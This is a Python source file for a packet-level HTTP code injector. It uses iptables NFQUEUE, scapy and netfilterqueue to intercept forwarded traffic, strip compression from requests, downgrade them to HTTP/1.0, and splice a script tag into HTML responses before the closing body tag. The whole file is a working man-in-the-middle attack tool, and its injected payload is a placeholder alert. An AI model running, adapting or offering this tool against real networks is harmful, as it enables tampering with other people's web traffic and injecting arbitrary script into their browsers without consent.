#!/usr/bin/env python3
"""
    injector:
    Author: Yusef Karim

    * If you want to setup a queue on your machine locally, run:
        iptables -I INPUT -j NFQUEUE --queue-num 1
        iptables -I OUTPUT -j NFQUEUE --queue-num 1
    * Example HTTP site for testing:
"""
from os import getuid
from sys import exit
import argparse
from subprocess import call
import re
from signal import signal, SIGINT
from scapy.packet import Raw
from scapy.layers.inet import IP, UDP, TCP
from scapy.compat import raw
import netfilterqueue

INJECTION = b"<script>alert('You are ugly');</script>"

def enable_iptable_queue():
    ret_val = call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1'])
    if(ret_val != 0):
        print("[-] Enabling iptables queue failed. Try again or do it manually")
        exit(1)

    print("[+] Successfully enabled iptables queue rule")


def set_load(pkt, load):
    pkt[Raw].load = load
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())
    if(scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw)):
        tcp = scapy_pkt.getlayer(TCP)
        raw_load = scapy_pkt.getlayer(Raw).load
        # If destination port is port 80, most likely a HTTP request, else HTTP response
        if(tcp.dport == 80 and raw_load):
            #print("[+] Request")
            # Strip reqeuest of any encoding (such as compression)
            raw_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b'', raw_load)
            # Change the request from HTTP/1.1 to HTTP/1.0 so content gets sent all at once
            raw_load = raw_load.replace(b"HTTP/1.1", b"HTTP/1.0")
        elif(tcp.sport == 80 and raw_load):
            content_length = re.search(b"(?:Content-Length:\s)(\d*)", raw_load)
            raw_load = raw_load.replace(b"</body>", INJECTION + b"</body>")
            # Recalculate the content length of the HTML page
            if(content_length and b"text/html" in raw_load):
                #print("[+] Attempting to inject code into response payload")
                content_length = content_length.group(1)
                new_content_length = str(int(content_length) + len(INJECTION)).encode()
                raw_load = raw_load.replace(content_length, new_content_length)

        if(raw_load != scapy_pkt.getlayer(Raw).load):
            scapy_pkt = set_load(scapy_pkt, raw_load)
            scapy_pkt = raw(scapy_pkt.__class__(raw(scapy_pkt)))
            pkt.set_payload(scapy_pkt)

    pkt.accept()


def cleanup_and_exit(signum, frame):
    ret_val = call(['iptables', '-F', 'FORWARD'])
    if(ret_val != 0):
        print("[-] Disabling iptables queue failed. Run 'iptables -F FORWARD' manually")
        exit(1)

    print("[+] Successfully disabled iptables queue rule\n[+] Goodbye!")
    exit(0)


if __name__ == "__main__":
    signal(SIGINT, cleanup_and_exit)
    if(getuid() != 0):
        print("[-] This program must be run as root")
        exit(1)
    else:
        print("[+] Starting code injector, press ctrl-c to quit")
        # Enable iptables queue then run the netfilter queue with specified callback
        enable_iptable_queue()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(1, process_packet)
        queue.run()

